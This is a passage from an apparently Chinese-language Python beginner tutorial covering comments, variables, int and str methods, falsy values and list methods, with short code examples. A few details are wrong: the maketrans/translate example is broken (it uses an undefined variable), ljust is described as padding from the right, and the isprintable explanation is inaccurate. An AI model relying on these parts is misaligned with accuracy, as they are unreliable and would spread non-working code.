<p>0x09 python 中的注释:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">单行注释 # 要注释的内容</span><br><span class="line">多行注释,单双引号均可,在python中单双引号作用完全相同,不存在强弱引用之别,跟其它语言稍有差别</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">   要注释内容...</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">&quot;&quot;&quot; </span><br><span class="line">   要注释内容...</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">python 语句结束不需要分号,代码块对应关系全部以缩进来区分,格式要求很严格,非常规整</span><br></pre></td></tr></table></figure></p>
<p>0x10 到底什么叫声明变量:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">就是一段存在指定内存地址上的数据,根据变量名可以快速找到这段数据,仅此而已</span><br></pre></td></tr></table></figure></p>
<p>0x11 在python中声明变量及变量命名规则须知 [和其它语言并无差别]:</p>
<p>变量名 必须由大小写字母,下划线,数字组成,但不能以数字开头,另外,禁止使用python各种内置关键字作为变量名,如下,<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username = &quot;klion&quot;</span><br><span class="line">password = &quot;admin&quot;</span><br><span class="line">username_new = username 支持变量直接再赋给变量 </span><br><span class="line">del username 		手动销毁变量,其实python内部也会自动回收没有指向的内存空间,又名垃圾回收机制</span><br></pre></td></tr></table></figure></p>
<p>0x12 熟练掌握 python中的一些基本数据类型,因为python本身是纯面向对象的,所以每种数据类型对应的其实就是一个类,把某个值赋给某个变量的过程其实就相当于根据这个数据类型所对应的类创建一个对象:</p>
<p>1] 数字类型,关键字 int , 注意,在python3.x中对于数字型并没有长度限制,python2.x 有长度限制</p>
<p>熟练使用数字类型的一些常用方法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int()</span><br><span class="line">把一个字符串强制转换成一个数字,前提是要转换的这个字符串必须全部是由纯数字组成</span><br><span class="line"> </span><br><span class="line">num = int(&quot;1234&quot;)</span><br><span class="line">print(type(num))</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int(num,base=2)</span><br><span class="line">把num字符串按照指定的进制数转换成十进制,2表示二进制,8表示八进制,16表示16进制,默认是转10进制的</span><br><span class="line"></span><br><span class="line">num = &quot;0011&quot;</span><br><span class="line">res = int(num,base=2)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bit_length 输出指定数字所占的有效二进制位数,</span><br><span class="line"></span><br><span class="line">num = int(&quot;3&quot;)</span><br><span class="line">res = num.bit_length()</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__add__ 比较简单,就是将两个数相加</span><br><span class="line"></span><br><span class="line">num = int(&quot;3&quot;)</span><br><span class="line">num1 = 34</span><br><span class="line">res = num.__add__(num1)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
<p>2] 字符串类型,关键字 str<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">定义一个字符串:</span><br><span class="line">单引号 &apos;str&apos;</span><br><span class="line">双引号 &quot;str&quot;</span><br><span class="line">三引号 &quot;&quot;&quot; str &quot;&quot;&quot; 跟注释的区别就在于有没有变量接收,没有接收就是注释,有接收就是字符串变量</span><br><span class="line">字符串连接符 &apos; + &apos;</span><br></pre></td></tr></table></figure></p>
<p>熟练使用字符串的一些常用内置方法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">len() 	统计字符串或者列表[以逗号分割]长度</span><br><span class="line">str_info = &quot;Hello klIon ^_^! hEllo KittY&quot;</span><br><span class="line">print(len(str_info))</span><br></pre></td></tr></table></figure></p>
<p>通过字符串索引 取值,切片<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str_info = <span class="string">"Hello klIon ^_^! hEllo KittY"</span></span><br><span class="line"></span><br><span class="line">print(str_info[<span class="number">0</span>])		取第一个字符</span><br><span class="line">print(str_info[<span class="number">2</span>:<span class="number">6</span>])		取第三个到第<span class="number">7</span>个字符,大于等于<span class="number">2</span>小于<span class="number">6</span></span><br><span class="line">print(str_info[<span class="number">9</span>:<span class="number">-1</span>])		取第<span class="number">10</span>个到倒数第一个之间的所有字符</span><br><span class="line">print(str_info[<span class="number">12</span>:<span class="number">-2</span>])		取第<span class="number">13</span>个到倒数第二个之间的所有字符</span><br></pre></td></tr></table></figure></p>
<p>循环取出字符串中所有的字符及其对应的索引<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">str_info = <span class="string">"Hello klIon ^_^! hEllo KittY"</span></span><br><span class="line">print(len(str_info))</span><br><span class="line">iterm = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> iterm &lt; len(str_info):</span><br><span class="line">	print(iterm,<span class="string">"=&gt;"</span>,str_info[iterm])</span><br><span class="line">	iterm += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> iterm <span class="keyword">in</span> str_info:</span><br><span class="line">	print(iterm)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;分隔符&quot;.join(要拆分拼接的字符串)    </span><br><span class="line">将指定的字符串按照指定的分割符进行拼接,返回一个新字符串</span><br><span class="line"></span><br><span class="line">str_info = &quot;hello linux&quot;</span><br><span class="line">print(&quot;*&quot;.join(str_info))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">split(&apos;分隔符&apos;,分割次数)  </span><br><span class="line">按照指定字符和分割次数进行分割,默认是从左到右分割,分割后返回一个的新列表,注意,分隔符本身并不包含在内</span><br><span class="line"></span><br><span class="line">str_info = &quot;this is a test demo code ! thanks &quot;</span><br><span class="line">print(str_info.split(&apos;t&apos;,2))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rsplit(&apos;分隔符&apos;,分割次数)  </span><br><span class="line">指定字符分割和分割次数,从右到做开始分割,同样返回一个新列表</span><br><span class="line"></span><br><span class="line">str_info = &quot;this is a test demo code ! thanks &quot;</span><br><span class="line">print(str_info.rsplit(&apos;t&apos;,2))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">partition(&apos;指定要切割的字符&apos;)  </span><br><span class="line">以指定的字符进行切割,不同于split的是,它只切割一次,也就是说当遇到第一个要切割的字符就是开始切割</span><br><span class="line">后面再遇到该字符就不再切割了,返回一个切割后的元祖,默认是从左到右进行切割的</span><br><span class="line"></span><br><span class="line">str_info = &quot;hello klion ^_^! hello kitty&quot;</span><br><span class="line">print(str_info.partition(&apos;l&apos;))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpartition(&apos;指定要切割的字符&apos;) 以指定的字符进行分割,从右往左开始</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">splitlines([False/True])以换行符进行分割,返回一个新列表,如果加上True则保留\n,否则则不保留</span><br><span class="line">str_info = &quot;this is a test \ndemo code ! thanks &quot;</span><br><span class="line">print(str_info.splitlines())</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">replace(&apos;要替换的内容[旧]&apos;,&apos;要替换成的内容[新]&apos;,要替换的次数[默认替换所有]) </span><br><span class="line">把旧字符串替换成新字符串,默认是从左到右进行替换的,返回一个替换后的新字符串</span><br><span class="line"></span><br><span class="line">str_info = &quot;welcome to klion &quot;</span><br><span class="line">print(str_info.replace(&apos;klion&apos;,&apos;linux&apos;,1))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find(&apos;字符序列&apos;,字符串索引起始位置,字符串索引结束位置) </span><br><span class="line">寻找指定的子序列在目标字符串中是否存在,默认是按照从左往右的顺序查找,查到则返回对应字符序列在目标字符串中的索引位置,查不到则返回-1</span><br><span class="line"></span><br><span class="line">str_info = &quot;welcome to klion,klion is a pentester! &quot;</span><br><span class="line">print(str_info.find(&apos;sec&apos;,0,100))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rfind(&apos;字符序列&apos;,字符串索引起始位置,字符串索引结束位置)  和find不同的是,find默认是从左开始查找的,而rfind是从右开始查找的</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">strip(指定要剔除的字符[应该是遍历循环剔除的,只要匹配到其中任意一个字符就剔掉])</span><br><span class="line">默认是剔除指定字符串两边的空白符[空格],亦可指定要剔除的指定字符,返回一个新的字符串</span><br><span class="line"></span><br><span class="line">str_info = &quot;***welcome to klion,klion is wa pentester!***w&quot;</span><br><span class="line">print(str_info.strip(&apos;w**&apos;))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lstrip(指定要剔除的字符)  </span><br><span class="line">默认是剔除指定字符串左侧的空白符,亦可指定要剔除的指定字符,返回一个新的字符串</span><br><span class="line"></span><br><span class="line">str_info = &quot;***welcome to klion,klion is wa pentester!***w&quot;</span><br><span class="line">print(str_info.lstrip(&apos;w**&apos;))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rstrip(指定要剔除的字符)  </span><br><span class="line">默认是剔除右边的空白符,亦可指定要剔除的指定字符,返回一个新的字符串</span><br><span class="line"></span><br><span class="line">str_info = &quot;***welcome to klion,klion is wa pentester!***w&quot;</span><br><span class="line">print(str_info.rstrip(&apos;w**&apos;))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">upper()  把指定字符串全部转换成大写,返回一个新的字符串</span><br><span class="line"></span><br><span class="line">str_info = &quot;***welcome to klion,klion is wa pentester!***w&quot;</span><br><span class="line">print(str_info.upper())</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">isupper() 判断目标字符串是否全部为大写,全部为大写则返回True,否则返回False</span><br><span class="line"></span><br><span class="line">str_info = &quot;***welcome to klion,klion is wa pentester!***w&quot;</span><br><span class="line">print(str_info.isupper())</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lower()  把指定字符串全部转换为小写,返回一个新的字符串</span><br><span class="line"></span><br><span class="line">str_info = &quot;***welcome to klion,klion is wa pentester!***w&quot;</span><br><span class="line">print(str_info.lower())</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">islower() 判断目标字符串是否全部为小写,全部为小写则返回True,否则返回False</span><br><span class="line"></span><br><span class="line">str_info = &quot;***welcome to klion,klion is wa pentester!***w&quot;</span><br><span class="line">print(str_info.islower())</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">casefold()将目标字符串全部转换成小写,会返回一个新的字符串,常用</span><br><span class="line"></span><br><span class="line">str_info = &quot;Hello klIon ^_^! hEllo Kitty&quot;</span><br><span class="line">print(str_info.casefold())</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">count(&apos;字符序列&apos;,目标字符串起始索引位置,目标字符串结束索引位置)</span><br><span class="line">统计某个字符序列在目标字符串中出现的次数,返回总共匹配到次数</span><br><span class="line"></span><br><span class="line">str_info = &quot;welcome to klion,klion is a pentester! &quot;</span><br><span class="line">print(str_info.count(&apos;klion&apos;,0,100))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">isdecimal() 检查目标字符串是否为十进制字符[其实就是指整数],是则返回True,反之,则返回False,实际中用的较多</span><br><span class="line"></span><br><span class="line">str_info = &quot;3&quot;</span><br><span class="line">print(str_info.isdecimal())</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">isnumeric() 检查目标字符串是否为纯数字,用法同上,是则返回True,否则返回False</span><br><span class="line">isalnum() 检查目标字符串是否为纯数字或字母组成,是则返回True,否则返回False</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">isspace() 检查目标字符串是否为空格,是则返回True,否则返回False</span><br><span class="line"></span><br><span class="line">str_info = &quot; &quot;</span><br><span class="line">print(str_info.isspace())</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">isalpha() 目标字符串是否为纯字母,是则返回True,否则返回False</span><br><span class="line"></span><br><span class="line">str_info = &quot;pentester&quot;</span><br><span class="line">print(str_info.isalpha())</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">isprintable检查目标字符串中是否存在不可见字符,如tab,空格...,是则返回True,否则返回False</span><br><span class="line"></span><br><span class="line">str_info = &quot;hello klion ^_^!&quot;</span><br><span class="line">print(str_info.isprintable())</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用于接收的变量[pattern] = maketrans(&apos;要替换的内容&apos;,&apos;替换成的内容&apos;) 有点儿类似linux中的tee命令,需要配合translate()一起使用</span><br><span class="line">translate(pattern) </span><br><span class="line"></span><br><span class="line">pattern = maketrans(&apos;A-XY-Za-xy-z&apos;, &apos;C-ZA-Bc-za-b&apos;)</span><br><span class="line">str = &quot;this is a convert....la!!!&quot;;</span><br><span class="line">print(str.translate(trantab))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">title把目标字符串转换成标题样式,返回一个新的字符串</span><br><span class="line">istitle 判断目标字符串是否为标题格式 [标题的每个单词首字母一般都会大写],是则返回True,否则返回False</span><br><span class="line"></span><br><span class="line">str_info = &quot;hello klion ^_^!&quot;</span><br><span class="line">t_res= str_info.title()</span><br><span class="line">print(t_res.istitle())</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ljust(要填充到的长度,用来填充的字符)   字符串填充,从右边开始填充</span><br><span class="line"></span><br><span class="line">str_info = &quot;hello klion ^_^!&quot;</span><br><span class="line">print(str_info.ljust(30,&apos;#&apos;))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rjust(要填充的长度,用来填充的字符)   字符串填充,从右边开始填充</span><br><span class="line"></span><br><span class="line">str_info = &quot;hello klion ^_^!&quot;</span><br><span class="line">print(str_info.rjust(30,&apos;#&apos;))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">center(要填充到的长度,&quot;要填充的内容&quot;) </span><br><span class="line">填充居中,返回一个新字符串</span><br><span class="line"></span><br><span class="line">str_info = &quot;hello klion ^_^!&quot;</span><br><span class="line">res = str_info.center(30,&quot;#&quot;)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">capitalize()  让整条语句首字母大写</span><br><span class="line"></span><br><span class="line">str_info = &quot;hello klion ^_^! hello kitty&quot;</span><br><span class="line">print(str_info.capitalize())</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">endswith() 判断目标字符串是否以指定字符结尾</span><br><span class="line"></span><br><span class="line">str_info = &quot;Hello klIon ^_^! hEllo KittY&quot;</span><br><span class="line">print(str_info.endswith(&apos;Y&apos;,21))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">startswith() 判断目标字符串是否以指定字符开头</span><br><span class="line"></span><br><span class="line">str_info = &quot;Hello klIon ^_^! hEllo KittY&quot;</span><br><span class="line">print(str_info.startswith(&apos;H&apos;,0))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">expandtabs(32) 把tab键替换成指定个数的空格,例如,下面可以直接利用此方法输出成表格的形式</span><br><span class="line"></span><br><span class="line">str_info = &quot;name:sec\tmail:sec@sec.org\tage:23\nname:sec\tmail:sec@sec.org\tage:23\nname:sec\tmail:sec@sec.org\tage:23\n&quot;</span><br><span class="line">print(str_info.expandtabs(32))</span><br></pre></td></tr></table></figure>
<p>布尔类型,关键字 Bool [务必注意开头要大写]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">True (真),1</span><br><span class="line">False(假),0</span><br></pre></td></tr></table></figure></p>
<p>为真的情况就不说了,只说为假的情况,如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">None</span><br><span class="line">&quot;&quot;  空字符串</span><br><span class="line">()  空元祖</span><br><span class="line">[]  空列表</span><br><span class="line">&#123;&#125;空字典</span><br></pre></td></tr></table></figure></p>
<p>3] 列表 list,以’[]’表示,以英文逗号对列表中的每个元素进行分割,列表中的元素可以是任意数据类型,并支持随意的增删改查及in操作,列表是有序的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">li = list()  创建空列表</span><br><span class="line">list_info = [&apos;klion&apos;,&apos;25&apos;,&apos;sec@sec. org&apos;,&apos;hello &apos;,&apos;5324213&apos;,&apos;num&apos;,&apos;pentester&apos;,&apos;kali&apos;]</span><br><span class="line">list_tmp  = [&apos;num&apos;,23]</span><br></pre></td></tr></table></figure></p>
<p>依然是通过 索引,切片取值,跟字符串用法基本是一样的,切完以后会返回一个新列表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(list_info[3:-1])</span><br></pre></td></tr></table></figure></p>
<p>for循环取出列表中的所有元素<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(len(list_info))# len() 方法用来统计列表元素个数</span><br><span class="line">for iterm in list_info:</span><br><span class="line">	print(iterm)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index(&apos;目标列表中的某个元素值&apos;,起始索引位置,结束索引位置)返回某个元素在目标列表中的索引数值</span><br><span class="line">print(list_info.index(&apos;pentester&apos;))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">insert(指定要插入到的索引位置,&apos;要插入的内容&apos;)往原有列表中插入新数据,会直接改变原有列表</span><br><span class="line">res = list_info.insert(5,&apos;security&apos;)</span><br><span class="line">print(list_info)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">append(要追加的元素) 往现有的列表里面里面追加一个新的列表项,把参数的整体作为一个列表元素</span><br><span class="line">res = list_info.append(list_tmp)</span><br><span class="line">print(list_info)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">extend(另一个列表)  通常用于将两个列表合并成一个列表,例如:字符串,列表,元祖,字典</span><br><span class="line">res = list_info.extend(list_tmp)</span><br><span class="line">print(list_info)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pop(指定要删除的元素索引值)删除指定的元素,会返回被删除的这个元素的值</span><br><span class="line">res = list_info.pop(3)</span><br><span class="line">print(list_info)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">remove(直接指定列表中的某个元素) 移除指定的元素,同样会直接改变原有列表</span><br><span class="line">res = list_info.remove(&apos;kali&apos;)</span><br><span class="line">print(list_info)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reverse() 反转列表元素,会直接改变原有列表</span><br><span class="line">res = list_info.reverse()</span><br><span class="line">print(list_info)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sort()  对列表中元素进行排序,默认升序</span><br><span class="line">res = list_info.sort()</span><br><span class="line">print(list_info)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">clear()   清空列表,单单只是清空列表项,并非删除该列表</span><br><span class="line">res = list_info.clear()</span><br><span class="line">print(list_info)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy() 把列表拷贝一份,属于浅拷贝</span><br><span class="line">new_list = list_info.copy()</span><br><span class="line">print(new_list)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">count() 统计某个元素在列表中出现的次数</span><br><span class="line">res = list_info.count(&apos;num&apos;)</span><br><span class="line">print(list_info)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">把列表批量替换成字符串,如果列表中只有字符串,可以&apos;&apos;.join(list) 自动循环拼接,如下,</span><br><span class="line">list_info = [&apos;sec&apos;,&apos;ok&apos;,&apos;connect&apos;]</span><br><span class="line">str_res = &apos;-&apos;.join(list_info)</span><br><span class="line">print(str_res)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">列表中既有字符串又有字符串则需要自己写循环,循环强制str转换成字符串再进行拼接</span><br><span class="line">str_tmp = &apos;&apos;</span><br><span class="line">list_info = [&apos;sec&apos;,34,&apos;ok&apos;,&apos;connect&apos;,&apos;login&apos;,&apos;succeed&apos;,110]</span><br><span class="line">for iterm in list_info:</span><br><span class="line">	str_tmp += str(iterm)</span><br><span class="line">print(str_tmp)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">多层嵌套取值</span><br><span class="line">list_info = [&apos;klion&apos;,[1,2,3,4,5,[&apos;k&apos;,&apos;23&apos;,&apos;this&apos;]],&apos;sec@sec. org&apos;,&apos;hello &apos;,&apos;5324213&apos;,&apos;num&apos;,&apos;pentester&apos;,&apos;kali&apos;]</span><br><span class="line">print(list_info[1][5][1])</span><br></pre></td></tr></table></figure>
